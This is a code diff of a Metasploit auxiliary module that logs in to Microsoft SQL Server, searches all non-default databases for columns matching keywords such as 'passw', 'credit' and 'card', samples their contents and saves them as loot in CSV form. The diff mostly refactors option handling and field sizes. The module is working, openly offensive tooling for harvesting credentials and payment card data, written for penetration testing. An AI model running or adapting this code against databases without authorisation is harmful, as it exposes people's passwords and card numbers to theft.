@@ -1,36 +1,3 @@
-##
-#  $Id: mssql_findandsampledata.rb 2011-12-11 nullbind $
-##
-
-##
-#  Credits: 
-#  Thank you Dijininja for the IDF module which
-#  was my inspiration for this.  Also, 
-#  thank you humble-desser, DarkOperator, HDM,
-#  and todb for helping me refine this MSF Module.
-#
-#  Finally, I would like to thank the Academy for 
-#  their time and consideration. :)
-##
-
-## 
-#  Use Case:
-#  This script will search through all of the non-default 
-#  databases on the SQL Server for columns that match the 
-#  keywords defined in the TSQL KEYWORDS option. If column 
-#  names are found that match the defined keywords and 
-#  data is present in the associated tables, the script 
-#  will select a sample of the records from each 
-#  of the affected tables.  The sample size is determined
-#  by the SAMPLESIZE option.  
-#
-#  This script is valuable for gathering evidence during PCI
-#  penetration tests and could also be used during the PCI 
-#  data dicovery process.
-#
-#  Important note: This script only works on SQL Server 2005 and 2008
-##
-
 require 'msf/core'
 
 
@@ -47,11 +14,14 @@ class Metasploit3 < Msf::Auxiliary
 			on the SQL Server for columns that match the keywords defined in the TSQL KEYWORDS 
 			option. If column names are found that match the defined keywords and data is present 
 			in the associated tables, the script will select a sample of the records from each of 
-			the affected tables.  The sample size is determined by the SAMPLESIZE option, and results
-			output in a CSV format.
+			the affected tables.  The sample size is determined by the SAMPLE_SIZE option, and results
+			output in a CSV format.  
+			
+			Thank you Dijininja for the IDF module which was my inspiration 
+			for this.  Also, thank you humble-desser, DarkOperator, HDM, and especially todb for 
+			helping me refine this MSF Module.
 			},
 			'Author'         => [ 'Scott Sutherland (nullbind) <scott.sutherland@netspi.com>' ],
-			'Version'        => '$Revision: 1000000000 $',
 			'License'        => MSF_LICENSE,
 			'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]],
 			'Targets'        => [[ 'MSSQL 2005', { 'ver' => 2005 }]]
@@ -60,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('KEYWORDS', [ true, 'Keywords to search for','passw|credit|card']),
-				OptString.new('SAMPLESIZE', [ true, 'Number of rows to sample',  '1']),			
+				OptInt.new('SAMPLE_SIZE', [ true, 'Number of rows to sample',  '1']),			
 			], self.class)
 	end
 
@@ -69,13 +39,11 @@ class Metasploit3 < Msf::Auxiliary
 		print_line("=" * str.length)
 	end
 
-	def run_host(ip)
+	def run_host(ip)		
+		sql_statement()
+	end
 	
-		#SETUP PRETTY OPTION VARIABLES FOR LATER USE		
-		opt_sample = datastore['SAMPLESIZE']
-		opt_ouput = datastore['OUTPUT']
-		opt_outputpath = datastore['OUTPUTPATH']
-		opt_keywords = datastore['KEYWORDS']
+	def sql_statement()
 	
 		#DEFINED HEADER TEXT
 		headings = [
@@ -84,9 +52,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		#DEFINE SEARCH QUERY AS VARIABLE
 		sql = "
-		-- CHECK IF VERSION IS COMPATABLE > than 2000
+		-- CHECK IF VERSION IS COMPATABLE = > than 2000
 		IF (SELECT SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') as VARCHAR), 1, 
-		CHARINDEX('.',cast(SERVERPROPERTY('ProductVersion') as VARCHAR),1)-1)) > 8
+		CHARINDEX('.',cast(SERVERPROPERTY('ProductVersion') as VARCHAR),1)-1)) > 0
 		BEGIN
 			
 			-- TURN OFF ROW COUNT
@@ -94,19 +62,19 @@ class Metasploit3 < Msf::Auxiliary
 			--------------------------------------------------
 			-- SETUP UP SAMPLE SIZE
 			--------------------------------------------------
-			DECLARE @SAMPLE_COUNT varchar(MAX);
-			SET @SAMPLE_COUNT = #{opt_sample};
+			DECLARE @SAMPLE_COUNT varchar(800);
+			SET @SAMPLE_COUNT = '#{datastore['SAMPLE_SIZE']}';
 
 			--------------------------------------------------
 			-- SETUP KEYWORDS TO SEARCH
 			--------------------------------------------------
-			DECLARE @KEYWORDS varchar(MAX);	
-			SET @KEYWORDS = '#{opt_keywords}|';
+			DECLARE @KEYWORDS varchar(800);	
+			SET @KEYWORDS = '#{datastore['KEYWORDS']}|';
 			
 			--------------------------------------------------
 			--SETUP WHERE STATEMENT CONTAINING KEYWORDS
 			--------------------------------------------------
-			DECLARE @SEARCH_TERMS varchar(MAX);	
+			DECLARE @SEARCH_TERMS varchar(800);	
 			SET @SEARCH_TERMS = ''; -- Leave this blank
 
 			-- START WHILE LOOP HERE -- BEGIN TO ITTERATE THROUGH KEYWORDS
@@ -115,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 					BEGIN
 						--SET VARIABLES UP FOR PARSING PROCESS
 						DECLARE @change int
-						DECLARE @keyword varchar(MAX)
+						DECLARE @keyword varchar(800)
 							
 						--SET KEYWORD CHANGE TRACKER
 						SELECT @change = CHARINDEX('|',@KEYWORDS); 		
@@ -142,12 +110,12 @@ class Metasploit3 < Msf::Auxiliary
 			IF OBJECT_ID('tempdb..##mytable') IS NULL 
 			BEGIN 
 				CREATE TABLE ##mytable (
-					server_name varchar(MAX),
-					database_name varchar(MAX),
-					table_schema varchar(MAX),
-					table_name varchar(MAX),		
-					column_name varchar(MAX),
-					column_data_type varchar(MAX)
+					server_name varchar(800),
+					database_name varchar(800),
+					table_schema varchar(800),
+					table_name varchar(800),		
+					column_name varchar(800),
+					column_data_type varchar(800)
 				) 
 			END
 
@@ -155,14 +123,14 @@ class Metasploit3 < Msf::Auxiliary
 			IF OBJECT_ID('tempdb..##mytable2') IS NULL 
 			BEGIN 
 				CREATE TABLE ##mytable2 (
-					server_name varchar(MAX),
-					database_name varchar(MAX),
-					table_schema varchar(MAX),
-					table_name varchar(MAX),
-					column_name varchar(MAX),
-					column_data_type varchar(MAX),
-					column_value varchar(MAX),
-					column_data_row_count varchar(MAX)
+					server_name varchar(800),
+					database_name varchar(800),
+					table_schema varchar(800),
+					table_name varchar(800),
+					column_name varchar(800),
+					column_data_type varchar(800),
+					column_value varchar(800),
+					column_data_row_count varchar(800)
 				) 
 			END
 
@@ -173,8 +141,8 @@ class Metasploit3 < Msf::Auxiliary
 			--------------------------------------------------
 
 			-- SETUP SOME VARIABLES FOR THE MYCURSOR1
-			DECLARE @var1 varchar(max);
-			DECLARE @var2 varchar(max);
+			DECLARE @var1 varchar(800);
+			DECLARE @var2 varchar(800);
 
 			--------------------------------------------------------------------
 			-- CHECK IF ANY NON-DEFAULT DATABASE EXIST
@@ -209,7 +177,7 @@ class Metasploit3 < Msf::Auxiliary
 				FROM ['+@var1+'].[INFORMATION_SCHEMA].[COLUMNS] WHERE '
 				
 				--APPEND KEYWORDS TO QUERY
-				DECLARE @fullquery VARCHAR(MAX);
+				DECLARE @fullquery varchar(800);
 				SET @fullquery = @var2+@SEARCH_TERMS;				
 					
 				EXEC(@fullquery);	
@@ -231,14 +199,14 @@ class Metasploit3 < Msf::Auxiliary
 					END
 				ELSE
 					BEGIN			
-						DECLARE @var_server varchar(max)
-						DECLARE @var_database varchar(max)
-						DECLARE @var_table varchar(max)
-						DECLARE @var_table_schema varchar(max)
-						DECLARE @var_column_data_type varchar(max)
-						DECLARE @var_column varchar(max)
-						DECLARE @myquery varchar(max)
-						DECLARE @var_column_data_row_count varchar(MAX)
+						DECLARE @var_server varchar(800)
+						DECLARE @var_database varchar(800)
+						DECLARE @var_table varchar(800)
+						DECLARE @var_table_schema varchar(800)
+						DECLARE @var_column_data_type varchar(800)
+						DECLARE @var_column varchar(800)
+						DECLARE @myquery varchar(800)
+						DECLARE @var_column_data_row_count varchar(800)
 						
 						DECLARE MY_CURSOR2 CURSOR
 						FOR
@@ -258,12 +226,12 @@ class Metasploit3 < Msf::Auxiliary
 							-- ADD AFFECTED SERVER/SCHEMA/TABLE/COLUMN/DATATYPE/SAMPLE DATA TO MYTABLE2
 							----------------------------------------------------------------------
 							-- GET COUNT
-							DECLARE @mycount_query as varchar(MAX);
-							DECLARE @mycount as varchar(MAX);
+							DECLARE @mycount_query as varchar(800);
+							DECLARE @mycount as varchar(800);
 
 							-- CREATE TEMP TABLE TO GET THE COLUMN DATA ROW COUNT
 							IF OBJECT_ID('tempdb..#mycount') IS NOT NULL DROP TABLE #mycount
-							CREATE TABLE #mycount(mycount VARCHAR(MAX));
+							CREATE TABLE #mycount(mycount varchar(800));
 							
 							-- SETUP AND EXECUTE THE COLUMN DATA ROW COUNT QUERY
 							SET @mycount_query = 'INSERT INTO #mycount SELECT DISTINCT 
@@ -359,116 +327,126 @@ class Metasploit3 < Msf::Auxiliary
 		else
 		BEGIN
 			SELECT 'This module only works on SQL Server 2005 and above.';
-		END
+		END	
 		
 		SET NOCOUNT OFF;"
+		
+				
+			
+		#STATUSING
+		print_line(" ")
+		print_status("Attempting to connect to the SQL Server at #{rhost}:#{rport}...")
+		
+		#CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING
+		begin
+			result = mssql_query(sql, false) if mssql_login_datastore
+			column_data = result[:rows]
+			print_status("Successfully connected to #{rhost}:#{rport}")			
+		rescue
+			print_status ("Failed to connect to #{rhost}:#{rport}.")
+		return
+		end	
 		
 		#CREATE TABLE TO STORE SQL SERVER DATA LOOT
 		sql_data_tbl = Rex::Ui::Text::Table.new(
 			'Header'  => 'SQL Server Data',
 			'Ident'   => 1,
 			'Columns' => ['Server', 'Database', 'Schema', 'Table', 'Column', 'Data Type', 'Sample Data', 'Row Count']
-		)			
-			
-		#STATUSING
-		print_line(" ")
-		print_line("[*] STATUS: Attempting to connect to the SQL Server at #{rhost}:#{rport}...")
+		)	
 		
-		#CREATE DATABASE CONNECTION AND SUBMIT QUERY WITH ERROR HANDLING
-		begin
-			result = mssql_query(sql, false) if mssql_login_datastore
-			column_data = result[:rows]
-			print_line("[*] STATUS: Successfully connected to #{rhost}:#{rport}")			
-			
-			#STATUSING		
-			print_line("[*] STATUS: Attempting to retrieve data ...")
+		#STATUSING		
+		print_status("Attempting to retrieve data ...")
 					
-			if (column_data.count < 7) 
-				#Save loot status
-				save_loot="no"
+		if (column_data.count < 7) 
+			#Save loot status
+			save_loot="no"
 			
-				#Return error from SQL server
-				column_data.each { |row|
-					print_line("[*] STATUS: #{row.to_s.gsub("[","").gsub("]","").gsub("\"","")}")
-				}
-			return
-			else
-				#SETUP COLUM WIDTH FOR QUERY RESULTS
-				#Save loot status
-				save_loot="yes"
-				column_data.each { |row|
-					0.upto(7) { |col|
-						row[col] = row[col].strip.to_s	
-						}		
-				}
-				print_line(" ")
-			end
-							
-			#SETUP ROW WIDTHS
-			widths = [0, 0, 0, 0, 0, 0, 0, 0]		
-			(column_data|headings).each { |row|
-				0.upto(7) { |col|				
-					widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col] 
-				}
-			}		
-			
-			#PRINT HEADERS
-			buffer1 = ""
-			buffer2 = ""
-			headings.each { |row|
-				0.upto(7) { |col|
-					buffer1 += row[col].ljust(widths[col] + 1)
-					buffer2 += row[col]+ ","
-				}
-				print_line(buffer1)	
-				buffer2 = buffer2.chomp(",")+ "\n"	 
-				File.open(opt_outputpath, 'ab') do |myfile| myfile.print(buffer2) 		
-				end if (opt_ouput.downcase == "yes" and opt_outputpath.downcase != "")			
+			#Return error from SQL server
+			column_data.each { |row|
+				print_status("#{row.to_s.gsub("[","").gsub("]","").gsub("\"","")}")
 			}
-			
-			#PRINT DIVIDERS
-			buffer1 = ""
-			buffer2 = ""
-			headings.each { |row|
-				0.upto(7) { |col|
-					divider = "=" * widths[col] + " "
-					buffer1 += divider.ljust(widths[col] + 1)
-				}
-				print_line(buffer1)				
-			}
-
-			#PRINT DATA
-			buffer1 = ""
-			buffer2 = ""		
-			print_line("")
+		return
+		else
+			#SETUP COLUM WIDTH FOR QUERY RESULTS
+			#Save loot status
+			save_loot="yes"
 			column_data.each { |row|
 				0.upto(7) { |col|
-					buffer1 += row[col].ljust(widths[col] + 1)
-					buffer2 += row[col] + ","
-				}
-				print_line(buffer1)
-				buffer2 = buffer2.chomp(",")+ "\n"	
-				
-				#WRITE QUERY OUTPUT TO TEMP REPORT TABLE
-				sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]] 
-						
-				buffer1 = ""
-				buffer2 = ""
-				print_line(buffer1)						
+					row[col] = row[col].strip.to_s	
+					}		
 			}
-			disconnect	
-			
-			#CONVERT TABLE TO CSV AND WRITE TO FILE
-			if (save_loot=="yes")
-				
-				filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlserver_query_results.csv"
-				path = store_loot("mssql.data", "text/plain", datastore['RHOST'], sql_data_tbl.to_csv, filename, "SQL Server query results", "mssql")
-				print_status("Query results have been saved to: #{path}")
-			end	
-		rescue
-		print_line("[-] ERROR : Failed to connect to #{rhost}:#{rport}.")
-		return
+			print_line(" ")
 		end
+						
+		#SETUP ROW WIDTHS
+		widths = [0, 0, 0, 0, 0, 0, 0, 0]		
+		(column_data|headings).each { |row|
+			0.upto(7) { |col|				
+				widths[col] = row[col].to_s.length if row[col].to_s.length > widths[col] 
+			}
+		}		
 		
-	end
+		#PRINT HEADERS		
+		buffer1 = ""
+		buffer2 = ""
+		headings.each { |row|
+			0.upto(7) { |col|
+				buffer1 += row[col].ljust(widths[col] + 1)
+				buffer2 += row[col]+ ","
+			}
+			print_line(buffer1)	
+			buffer2 = buffer2.chomp(",")+ "\n"	 		
+		}
+		
+		#PRINT DIVIDERS
+		buffer1 = ""
+		buffer2 = ""
+		headings.each { |row|
+			0.upto(7) { |col|
+				divider = "=" * widths[col] + " "
+				buffer1 += divider.ljust(widths[col] + 1)
+			}
+			print_line(buffer1)				
+		}
+		
+		#PRINT DATA
+		buffer1 = ""
+		buffer2 = ""		
+		print_line("")
+		column_data.each { |row|
+			0.upto(7) { |col|
+				buffer1 += row[col].ljust(widths[col] + 1)
+				buffer2 += row[col] + ","
+			}
+			print_line(buffer1)
+			buffer2 = buffer2.chomp(",")+ "\n"	
+			
+			#WRITE QUERY OUTPUT TO TEMP REPORT TABLE
+			sql_data_tbl << [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]] 
+					
+			buffer1 = ""
+			buffer2 = ""
+			print_line(buffer1)						
+		}
+		disconnect	
+			
+		this_service = nil
+		if framework.db and framework.db.active
+			this_service = report_service(
+				:host  => rhost,
+				:port => rport,
+				:name => 'mssql',
+				:proto => 'tcp'
+			)
+		end
+			
+		#CONVERT TABLE TO CSV AND WRITE TO FILE
+		if (save_loot=="yes")
+			filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_sqlserver_query_results.csv"
+			path = store_loot("mssql.data", "text/plain", datastore['RHOST'], sql_data_tbl.to_csv, filename, "SQL Server query results",this_service)
+			print_status("Query results have been saved to: #{path}")
+		end		
+		
+	end	
+	
 end
